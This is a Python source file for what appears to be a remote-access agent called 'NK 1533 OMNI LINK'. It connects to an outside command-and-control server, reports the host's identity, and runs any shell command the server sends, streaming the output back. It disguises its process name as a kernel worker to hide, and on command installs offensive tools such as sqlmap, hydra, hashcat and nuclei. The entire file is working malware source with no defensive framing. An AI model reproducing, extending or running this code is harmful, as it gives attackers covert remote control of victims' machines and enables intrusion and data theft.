#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# NK 1533 v110.0 [OMNI LINK]
# FIX: REMOVED NAMESPACE RESTRICTION + HIGH VISIBILITY LOGS

import sys, socket, time, os, platform, subprocess, json, threading, re, random, base64, struct
import shutil
import urllib.request
import urllib.parse
import uuid
import ssl
import functools

# --- FORCE FLUSH ---
print = functools.partial(print, flush=True)

# --- CONFIG ---
C2_SERVER = "https://c2nk.onrender.com"
VERSION = "v110.0 (OMNI LINK)"
AGENT_ID = "" 

# --- ANSI COLORS ---
R = '\033[91m' 
G = '\033[92m'
Y = '\033[93m'
B = '\033[94m'
P = '\033[95m'
C = '\033[96m'
W = '\033[0m'

# --- IDENTITY ---
def get_device_id():
    try:
        # MUST CONTAIN 'NK_1533' TO SHOW IN DASHBOARD
        mac = uuid.getnode()
        host = platform.node().replace('-', '_')
        return f"NK_1533_{host}_{mac}"
    except:
        return f"NK_1533_GHOST_{random.randint(1000,9999)}"

AGENT_ID = get_device_id()

# --- DEPENDENCIES ---
def install_pip(package):
    try:
        subprocess.call([sys.executable, "-m", "pip", "install", package, "--quiet"])
    except: pass

try:
    import socketio
    import requests
    import psutil
    try: import setproctitle; HAS_GHOST = True
    except: HAS_GHOST = False; install_pip('setproctitle')
    urllib3 = None
    try: import urllib3; urllib3.disable_warnings()
    except: pass
except ImportError:
    print(Y + "[!] Installing Dependencies..." + W)
    install_pip('python-socketio[client]')
    install_pip('requests')
    install_pip('psutil')
    install_pip('setproctitle')
    os.execv(sys.executable, ['python3'] + sys.argv)

import socketio
import requests
import psutil
try: import setproctitle
except: pass

# --- SOCKET CLIENT (Standard) ---
sio = socketio.Client(
    ssl_verify=False, 
    logger=False, 
    engineio_logger=False,
    reconnection=True
)

# ==========================================
# MODULE: ARSENAL INSTALLER
# ==========================================
class ArsenalInstaller:
    def __init__(self, sio_ref):
        self.sio = sio_ref

    def log(self, msg):
        print(msg)
        self.sio.emit('agent_event', {'type': 'SYSTEM', 'agentId': AGENT_ID, 'payload': msg})

    def install_all(self):
        self.log(P + "[INSTALLER] PROVISIONING HEAVY ARSENAL..." + W)
        os.system("DEBIAN_FRONTEND=noninteractive apt-get update -qq")
        tools = ["nmap", "sqlmap", "john", "hashcat", "hydra", "curl", "wget", "git", "golang", "python3-pip", "nikto"]
        self.log(C + f"   Installing APT: {', '.join(tools)}..." + W)
        os.system(f"DEBIAN_FRONTEND=noninteractive apt-get install -y {' '.join(tools)} -qq")
        
        go_tools = [
            "github.com/projectdiscovery/nuclei/v2/cmd/nuclei@latest",
            "github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest",
            "github.com/projectdiscovery/httpx/cmd/httpx@latest",
            "github.com/ffuf/ffuf@latest"
        ]
        self.log(C + "   Installing Go Tools..." + W)
        home = os.path.expanduser("~")
        go_bin = os.path.join(home, "go", "bin")
        os.environ["PATH"] += os.pathsep + go_bin
        
        for tool in go_tools:
            name = tool.split('/')[-1].split('@')[0]
            if not shutil.which(name):
                self.log(f"         > Installing {name}...")
                os.system(f"go install {tool}")
        
        self.log(G + "[INSTALLER] COMPLETED. TOOLS READY." + W)

# ==========================================
# MODULE: EXECUTION ENGINE
# ==========================================
class ExecutionEngine:
    def __init__(self, sio_ref):
        self.sio = sio_ref

    def execute(self, cmd):
        print(C + f"[EXEC] {cmd}" + W)
        self.sio.emit('agent_event', {'type': 'INFO', 'agentId': AGENT_ID, 'payload': f"STARTED: {cmd}"})

        try:
            home = os.path.expanduser("~")
            env = os.environ.copy()
            go_bin = os.path.join(home, "go", "bin")
            if os.path.exists(go_bin):
                env["PATH"] += os.pathsep + go_bin

            process = subprocess.Popen(
                cmd, 
                shell=True, 
                stdout=subprocess.PIPE, 
                stderr=subprocess.STDOUT,
                env=env,
                bufsize=1, 
                universal_newlines=True 
            )

            for line in process.stdout:
                clean_line = line.strip()
                if clean_line:
                    print(clean_line)
                    self.sio.emit('agent_event', {'type': 'SHELL_OUTPUT', 'agentId': AGENT_ID, 'payload': clean_line})
            
            process.wait()
            print(G + f"[DONE] EXIT: {process.returncode}" + W)
            self.sio.emit('agent_event', {'type': 'SUCCESS', 'agentId': AGENT_ID, 'payload': f"FINISHED (Code: {process.returncode})"})

        except Exception as e:
            print(R + f"[ERROR] {e}" + W)
            self.sio.emit('agent_event', {'type': 'ERROR', 'agentId': AGENT_ID, 'payload': str(e)})

engine = ExecutionEngine(sio)
installer = ArsenalInstaller(sio)

# ==========================================
# EVENTS (NO NAMESPACE RESTRICTION)
# ==========================================
@sio.event
def connect():
    print(G + f"\n[+] CONNECTED TO HIVE ({C2_SERVER})" + W)
    print(P + f"[i] IDENTITY: {AGENT_ID}" + W)
    
    sio.emit('identify', {
        'id': AGENT_ID, 
        'type': 'agent_hive', 
        'os': f"{platform.system()} {platform.release()}", 
        'ip': '0.0.0.0', 
        'hostname': platform.node()
    })
    
    if 'setproctitle' in sys.modules:
        setproctitle.setproctitle("kworker/u4:0-events")

@sio.event
def connect_error(data):
    print(R + f"[!] CONN ERROR: {data}" + W)

@sio.event
def disconnect():
    print(R + "[!] DISCONNECTED" + W)

@sio.on('exec_cmd')
def on_exec_cmd(data):
    # MASSIVE DEBUG PRINT
    print(Y + f"\n!!! COMMAND RECEIVED: {data} !!!" + W)
    
    cmd = data.get('cmd')
    if not cmd: 
        print(R + "Error: Empty command" + W)
        return

    if cmd == 'install_arsenal':
        threading.Thread(target=installer.install_all).start()
    else:
        threading.Thread(target=engine.execute, args=(cmd,)).start()

# ==========================================
# MAIN
# ==========================================
def main():
    if os.name == 'nt': os.system('cls')
    else: os.system('clear')
    print(P + f"NK {VERSION} - GLOBAL LISTENER" + W)
    print(C + f"ID: {AGENT_ID}" + W)
    print(Y + "Connecting..." + W)
    
    while True:
        try:
            if not sio.connected:
                sio.connect(C2_SERVER)
            
            print('.', end='', flush=True)
            sio.sleep(5)
            
        except KeyboardInterrupt:
            sys.exit(0)
        except Exception as e:
            print(R + f"\n[!] RETRYING: {e}" + W)
            time.sleep(5)

if __name__ == "__main__":
    main()
